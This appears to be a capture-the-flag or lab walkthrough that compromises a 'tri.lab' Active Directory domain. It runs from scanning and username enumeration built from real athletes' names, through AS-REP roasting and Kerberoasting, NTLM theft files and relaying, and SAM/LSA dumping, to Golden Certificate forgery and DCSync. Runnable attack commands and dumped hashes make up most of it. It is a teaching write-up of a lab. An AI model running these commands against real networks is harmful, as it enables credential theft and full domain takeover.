### NMAP Scanning - BIKE-SRV

```python
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
|_ssl-date: 2026-07-02T08:04:25+00:00; -1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: TRI
|   NetBIOS_Domain_Name: TRI
|   NetBIOS_Computer_Name: BIKE-SRV
|   DNS_Domain_Name: tri.lab
|   DNS_Computer_Name: BIKE-SRV.tri.lab
|   DNS_Tree_Name: tri.lab
|   Product_Version: 10.0.20348
|_  System_Time: 2026-07-02T08:03:46+00:00
| ssl-cert: Subject: commonName=BIKE-SRV.tri.lab
| Issuer: commonName=BIKE-SRV.tri.lab
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-01T07:52:06
| Not valid after:  2026-12-31T07:52:06
| MD5:   8d1e:154c:7b4c:1cbc:bf21:ab1d:8f14:8337
| SHA-1: c639:aa27:966b:6145:e006:2313:f52b:8f73:2eab:527c
| -----BEGIN CERTIFICATE-----
| MIIC5DCCAcygAwIBAgIQNxX/KpB/GKJJg4f7wTqHPDANBgkqhkiG9w0BAQsFADAb
| MRkwFwYDVQQDExBCSUtFLVNSVi50cmkubGFiMB4XDTI2MDcwMTA3NTIwNloXDTI2
| MTIzMTA3NTIwNlowGzEZMBcGA1UEAxMQQklLRS1TUlYudHJpLmxhYjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAPoVIT1nCDqVpMx05ghF12qMqT9g9UW/
| lh+qSqE6q4txG1yoxyW4G6myjCSzmhbT72Pa2dGJLRgGB0u/n9TnMleKGTcykMew
| xtrjBVtRzerrOrbPL55v3fs3O8a8GBY2xnwEgOhmuQi5tblCpz0ok8+vaslGu3Y7
| 5x0NDxF2ylV/FDtuZqQzgyNYFontj34sLziEDAzpNcJ+zRAG4pNLDuuKcuyv2CDP
| JoUuoMj9F7OURGA4963AoPr5XFmyC0X/9u5NuN8t7RgDvhsw4EysZQ1t10lMhByF
| m0fLqQ+IUEGPwfxA1a9zNEA74IZXF5futfvOqbxqFb5BkWgkuewKSqECAwEAAaMk
| MCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEB
| CwUAA4IBAQCiFYBwawO6dbrpir9dWE868tOKwCnCAwHzzep7m6WajAVbGZMRfZH0
| uCIYS9K3rv/S3skRhBzYGi8737zbRz8/ML1cZqv4qD9VfURSALq9qSxnmlpqb+MD
| hjNyLgy6anRiq6Yd9uXL5ooCj3dLVE/q/oTD5i3oxlIkdots7c+bIN1bvTCEHVkI
| XyPcDmpjS9JvvoJDULivNjB1DXV+XyrC7Oia2y29R051fkj9Oz9fLbR9MVAGPzJ0
| ZyhmGF1CSr+w6UOhZ3VOU179WnW4Xdarxe9J3VhPwtnVY38Mr1TE1stNd90bXCgl
| D8Rv1NPvZ3I2JcrTPBVxWdAfss5265XS
|_-----END CERTIFICATE-----
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time:
|   date: 2026-07-02T08:03:49
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 49038/tcp): CLEAN (Timeout)
|   Check 2 (port 12520/tcp): CLEAN (Timeout)
|   Check 3 (port 39330/udp): CLEAN (Timeout)
|   Check 4 (port 29247/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
```

Generating a hosts file for all three targets directly with netexec: `poetry run NetExec smb ~/Desktop/Workspace/hacksmarter/triathlon/ips.txt --generate-hosts-file hosts.txt`

{% image4 %}

### External Enumeration - Triathlon OSINT

The objective and scope framed this as a real engagement, so the next step is open-source research on the members of the 2025 U.S. Elite Triathlon National Team. This article lists them: [https://www.usatriathlon.org/articles/news/usa-triathlon-announces-2025-u-s-elite-triathlon-national-team](https://www.usatriathlon.org/articles/news/usa-triathlon-announces-2025-u-s-elite-triathlon-national-team)

{% image5 %}

Copying both the women's and men's names into a list to build username variations from:

```python
Gwen Jorgensen
Kirsten Kasper
Taylor Knibb
Summer Rappaport
Gina Sereno
Taylor Spivey
Morgan Pearson
John Reed
Seth Rider
```

Feeding these into namemash ( [https://github.com/krlsio/python/blob/main/namemash.py](https://github.com/krlsio/python/blob/main/namemash.py) ) generates a list of likely domain usernames:

{% image6 %}

Running `kerbrute` against the generated list confirms which of the accounts actually exist:

```python
kerbrute userenum --dc RUN-SRV.tri.lab --domain tri.lab possible_domain_users.txt
```

{% image7 %}

Three of the usernames are valid:

```python
2026/07/02 11:17:11 >  [+] VALID USERNAME:	 m.pearson@tri.lab
2026/07/02 11:17:11 >  [+] VALID USERNAME:	 t.spivey@tri.lab
2026/07/02 11:17:11 >  [+] VALID USERNAME:	 j.reed@tri.lab
```

### SMB Enumeration - Guest & NULL Authentication

Neither Guest nor NULL authentication is accepted:

{% image8 %}

### AS-REP Roasting → Kerberoasting w/o pre-authentication

Attempting an AS-REP Roast against the discovered user list:

{% image9 %}

The account `t.spivey` has pre-authentication disabled and returns a hash. Attempting to crack it:

{% image10 %}

The hash does not crack. Since `t.spivey` carries the `UF_DONT_REQUIRE_PREAUTH` flag, it can be used to request service tickets for other accounts through Kerberoasting without pre-authentication:

```python
impacket-GetUserSPNs -no-preauth 't.spivey' -usersfile users.txt -dc-host RUN-SRV.tri.lab tri.lab/
```

{% image11 %}

This returns a Kerberoast hash for another account, but it also resists a straight dictionary attack:

{% image12 %}

Switching to `hashcat` with a rule set applied to the wordlist widens the candidate space:

```python
hashcat -m 13100 j.reed.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule
```

This approach recovers the password:

{% image13 %}

Confirming the credentials by enumerating the SMB shares with `netexec`: `poetry run NetExec smb ~/Desktop/Workspace/hacksmarter/triathlon/ips.txt -u 'j.reed' -p 'Utah123' --shares`

{% image14 %}

The most interesting share is `TransitionZone$`, which grants both READ and WRITE permissions. Before diving into it, the valid credentials are worth using to map the domain first.

### Active Directory - Domain Reconnaissance

Running `rusthound-ce` to map the domain:

```python
rusthound --domain tri.lab --ldapusername 'j.reed' --ldappassword 'Utah123' --ldapfqdn RUN-SRV.tri.lab --ldapip 10.1.228.26 --name-server 10.1.228.26 --collectionmethod All --zip
```

{% image15 %}

While the BloodHound data ingests, `bloodyAD` enumerates the WRITE permissions the current user holds:

{% image16 %}

Nothing useful surfaces beyond the current user's own attributes, which every domain user can write to by default.

The BloodHound graph likewise shows nothing beyond the usual default group memberships:

{% image17 %}

### SMB - TransitionZone Share

Returning to the `TransitionZone$` share to look for anything useful:

{% image18 %}

The share is empty. With WRITE access, though, it can be seeded with malicious files that coerce any user who browses it into leaking their NTLM hash. The [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) toolkit generates exactly these files:

{% image19 %}

Shortly after planting the files, the NTLM hash of the user `e.ackerlund` is captured:

{% image20 %}

The captured hash does not crack:

{% image21 %}

### NTLM Relaying - BIKE-SRV

Cracking it with `hashcat` and the `best66.rule` also fails. As noted in the SMB hosts enumeration, the other two servers do not enforce SMB signing, which makes them vulnerable to NTLM relaying. The one rule that constrains the setup is that a hash cannot be relayed back to the host that produced it, so the theft file is planted on `SWIM-SRV` and the captured authentication is relayed to `BIKE-SRV`:

```python
python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t smb://BIKE-SRV.tri.lab -smb2support -socks
```

{% image22 %}

Pressing `[ENTER]` and typing `socks` lists the active relayed sessions:

{% image23 %}

The domain and username must match exactly what `ntlmrelayx` reports. Without `-d TRI`, netexec defaults to `TRI.LOCAL` and the SOCKS session fails to authenticate.

The password supplied to netexec is arbitrary, because the SOCKS proxy reuses the already-relayed authentication rather than performing a real login.

Using the SOCKS session requires adding the proxy entry to the end of `/etc/proxychains4.conf`:

{% image24 %}

The relayed session can now enumerate the target server through proxychains:

```python
sudo proxychains4 -f /etc/proxychains4.conf -q netexec smb bike-srv.tri.lab -u 'E.ACKERLUND' -p 'FAKE' -d TRI --shares
```

{% image25 %}

`E.ACKERLUND` is a local administrator on `BIKE-SRV`, shown by the `(Pwn3d!)` marker, so the next step is dumping the SAM and LSA secrets:

```python
➜  theft sudo proxychains4 -f /etc/proxychains4.conf -q netexec smb bike-srv.tri.lab -u 'E.ACKERLUND' -p 'FAKE' -d TRI --sam
SMB         224.0.0.1       445    BIKE-SRV         [*] Windows Server 2022 Build 20348 (name:BIKE-SRV) (domain:tri.lab) (signing:False) (SMBv1:False)
SMB         224.0.0.1       445    BIKE-SRV         [+] TRI\E.ACKERLUND:FAKE (Guest)(Pwn3d!)
SMB         224.0.0.1       445    BIKE-SRV         [*] Dumping SAM hashes
SMB         224.0.0.1       445    BIKE-SRV         Administrator:500:aad3b435b51404eeaad3b435b51404ee:9a6434f863c1835d5f1baf39a544ad57:::
SMB         224.0.0.1       445    BIKE-SRV         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         224.0.0.1       445    BIKE-SRV         DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         224.0.0.1       445    BIKE-SRV         WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:d7da45674bae3a0476c0f64b67121f7d:::
SMB         224.0.0.1       445    BIKE-SRV         [+] Added 4 SAM hashes to the database
```

Dumping the LSA secrets next:

```python
➜  theft sudo proxychains4 -f /etc/proxychains4.conf -q netexec smb bike-srv.tri.lab -u 'E.ACKERLUND' -p 'FAKE' -d TRI --lsa
SMB         224.0.0.1       445    BIKE-SRV         [*] Windows Server 2022 Build 20348 (name:BIKE-SRV) (domain:tri.lab) (signing:False) (SMBv1:False)
SMB         224.0.0.1       445    BIKE-SRV         [+] TRI\E.ACKERLUND:FAKE (Guest)(Pwn3d!)
SMB         224.0.0.1       445    BIKE-SRV         [+] Dumping LSA secrets
SMB         224.0.0.1       445    BIKE-SRV         TRI.LAB/Administrator:$DCC2$10240#Administrator#9ba54f4ea00cab3cd7afc83b1a2ee62d: (2025-10-03 22:30:08)
SMB         224.0.0.1       445    BIKE-SRV         TRI.LAB/m.pearson:$DCC2$10240#m.pearson#05b458fcb2ebb0869a4979097a6bedaa: (2025-10-06 05:25:20)
SMB         224.0.0.1       445    BIKE-SRV         TRI\BIKE-SRV$:aes256-cts-hmac-sha1-96:65a543b52b662b89d85b00e90c0428f4e707e876a59e3410af873436202804f7
SMB         224.0.0.1       445    BIKE-SRV         TRI\BIKE-SRV$:aes128-cts-hmac-sha1-96:90f7c4c0b9d89325ded39365fde5bd98
SMB         224.0.0.1       445    BIKE-SRV         TRI\BIKE-SRV$:des-cbc-md5:8a01e331a4e37f91
SMB         224.0.0.1       445    BIKE-SRV         TRI\BIKE-SRV$:plain_password_hex:9b8231f6ea98a7c92a759b1a90b82447528c71e6edb60963f667742e7367b36bac76159f5aa6c7ffc5cd957de4e319c7da0957db30f2aaf65a05c01a9a43ed4fc447fcc0fddc6555e2d78b07c24f60eb508640582b74f5a0f39700c9675a9330b9f332a062c1ca7d95aff4115d204c2b997866dc655d062dd188c3ee6ee2af958e167e1d65338607926a9cc8f7aedb616cdc5e6e536b1b54030d43e6a23df77c789baa92c4e7a2e27029595ab111f1ae6d11a02c7cd8e6be38ccc13bf81006e23dba5710c4dc3b59ad228a7db19f4214944a325abdc513197ecac0b9aab0d6fa4399e260a6aec8d4b45904561ac0a092
SMB         224.0.0.1       445    BIKE-SRV         TRI\BIKE-SRV$:aad3b435b51404eeaad3b435b51404ee:5f16e97a6ffca3a294b246fbc0dd1d30:::
SMB         224.0.0.1       445    BIKE-SRV         dpapi_machinekey:0xa2d39c0a2a834f5ffa23e290b622fa3a8a83c285
dpapi_userkey:0x7cd091235ffccf5405522a0079471092772d3b38
```

The LSA dump includes a DCC2 hash for `m.pearson`, a domain cached credential left on the machine from a previous logon. These are crackable offline with `hashcat`:

```python
hashcat -m 2100 -a 0 '$DCC2$10240#m.pearson#05b458fcb2ebb0869a4979097a6bedaa' /usr/share/wordlists/rockyou.txt
```

{% image26 %}

With the recovered password, enumerating the servers' shares again to see what this account can reach:

{% image27 %}

This account is a local administrator on `SWIM-SRV`, again indicated by `(Pwn3d!)`, so the SAM and LSA secrets there are dumped as well:

```python
➜  NetExec git:(main) ✗ poetry run NetExec smb SWIM-SRV -u 'm.pearson' -p '2silver' --sam
SMB         10.1.4.42       445    SWIM-SRV         [*] Windows Server 2022 Build 20348 x64 (name:SWIM-SRV) (domain:tri.lab) (signing:False) (SMBv1:None)
SMB         10.1.4.42       445    SWIM-SRV         [+] tri.lab\m.pearson:2silver (Pwn3d!)
SMB         10.1.4.42       445    SWIM-SRV         [*] Dumping SAM hashes
SMB         10.1.4.42       445    SWIM-SRV         Administrator:500:aad3b435b51404eeaad3b435b51404ee:3db8f8a14c6de870a6a3afed77562d4f:::
SMB         10.1.4.42       445    SWIM-SRV         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.1.4.42       445    SWIM-SRV         DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.1.4.42       445    SWIM-SRV         WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:d7da45674bae3a0476c0f64b67121f7d:::
SMB         10.1.4.42       445    SWIM-SRV         [+] Added 4 SAM hashes to the database
```

Followed by the LSA secrets:

```python
➜  NetExec git:(main) ✗ poetry run NetExec smb SWIM-SRV -u 'm.pearson' -p '2silver' --lsa
SMB         10.1.4.42       445    SWIM-SRV         [*] Windows Server 2022 Build 20348 x64 (name:SWIM-SRV) (domain:tri.lab) (signing:False) (SMBv1:None)
SMB         10.1.4.42       445    SWIM-SRV         [+] tri.lab\m.pearson:2silver (Pwn3d!)
SMB         10.1.4.42       445    SWIM-SRV         [*] Dumping LSA secrets
SMB         10.1.4.42       445    SWIM-SRV         TRI.LAB/Administrator:$DCC2$10240#Administrator#9ba54f4ea00cab3cd7afc83b1a2ee62d: (2025-10-03 22:34:43)
SMB         10.1.4.42       445    SWIM-SRV         TRI.LAB/e.ackerlund:$DCC2$10240#e.ackerlund#58426247eda387809d6a98127d52d8c9: (2026-07-02 09:01:50)
SMB         10.1.4.42       445    SWIM-SRV         TRI\SWIM-SRV$:aes256-cts-hmac-sha1-96:65b7776f691f3f704dd0e8149c4b4ea28a1824eb9b831e134bf205cd1efe10b0
SMB         10.1.4.42       445    SWIM-SRV         TRI\SWIM-SRV$:aes128-cts-hmac-sha1-96:d27ecee7197d66c33dd8978a4bb7d80d
SMB         10.1.4.42       445    SWIM-SRV         TRI\SWIM-SRV$:des-cbc-md5:ec4a3d6bfb672fd5
SMB         10.1.4.42       445    SWIM-SRV         TRI\SWIM-SRV$:plain_password_hex:4aceecd72f323380a1e18401169f7cc5d8dc317ffaf297c3a754af42ef1891b081719b4feb050d80fee48c8e9e92f67cd40eecc6a9cd1a28f3d1da318b90846168b071b2cec514a0b163305ad514925164fe7e4efb6fa6f27c5eb760838c708fa6ca3f3161fe52d40118afcf365635f9b048045d8b022f6c937ddd43dd97e1ef2059790e0ecd0dbf0838434dbdf6373fbafa883db6d7f2fee3901dd9b41f49b3e5e00017d7007c4099c5cb5dcb232dfcacb091d739ea386e4e45362842267a78cfb20a0d0f1d7157d7ca792001a4f13cfa88b51a97947d9c489e3dba8068f602395cd2e4d1953c8042c04c6001601164
SMB         10.1.4.42       445    SWIM-SRV         TRI\SWIM-SRV$:aad3b435b51404eeaad3b435b51404ee:9bab9ccb8f498c290e624c92ed172c56:::
SMB         10.1.4.42       445    SWIM-SRV         dpapi_machinekey:0x7d89a8d24da44126724e23a7dfb04c5060917cf6
dpapi_userkey:0xa76480d17bd5127d94f33cd46ee25dfd2fd6f9e8
```

The hashes recovered here do not crack, however.

### Golden Certificate Attack

The BloodHound data indicates an Active Directory Certificate Services server is present, which can be verified with the `-M adcs` flag:

{% image28 %}

The CA role sits on the SWIM server, where local admin privileges are already in hand, which opens the door to a **Golden Certificate** attack.

The attack extracts the CA's private key and uses it to sign arbitrary certificates that Active Directory fully trusts, since they carry the CA's own signature. It is conceptually the certificate equivalent of forging a Kerberos Golden Ticket with a compromised `krbtgt` account.

```python
certipy-ad ca -backup -ca "tri-CA" -username "m.pearson@tri.lab" -password "2silver" -dc-ip "10.1.228.26" -target SWIM-SRV
```

Forging a certificate for a Domain Admin using the backed-up CA key:

```python
certipy-ad forge -ca-pfx tri-CA.pfx -upn j.reed_adm@tri.lab -subject "CN=Domain Admins,CN=Users,DC=tri,DC=lab"
```

{% image29 %}

Authenticating with the forged certificate to extract the target's NT hash:

```python
certipy-ad auth -pfx j.reed_adm_forged.pfx -dc-ip 10.1.228.26 -username j.reed_adm -domain tri.lab
```

With the NT hash of the `j.reed_adm` account, a DCSync attack via `secretsdump` recovers the domain secrets, including the krbtgt hash that satisfies the objective:

{% image30 %}